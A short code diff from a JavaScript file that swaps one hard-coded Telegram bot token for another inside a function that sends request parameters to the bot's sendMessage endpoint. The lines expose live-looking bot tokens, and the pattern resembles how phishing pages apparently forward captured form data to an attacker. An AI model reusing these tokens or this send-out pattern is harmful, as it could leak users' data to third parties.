@@ -124,7 +124,7 @@
         }
         async function ajaxSend(params) {
             try  {
-                return Promise.resolve( await axios.get('https://api.telegram.org/bot1900566355:AAEB7fxQ0BW-WnWtBPb7Rg1-AyVVo_vKng0/sendMessage', {
+                return Promise.resolve( await axios.get('https://api.telegram.org/bot1649773011:AAFMIGsB10-sntTTSub9j78sGckolNwn3nc/sendMessage', {
                     params: params
                 }))
 
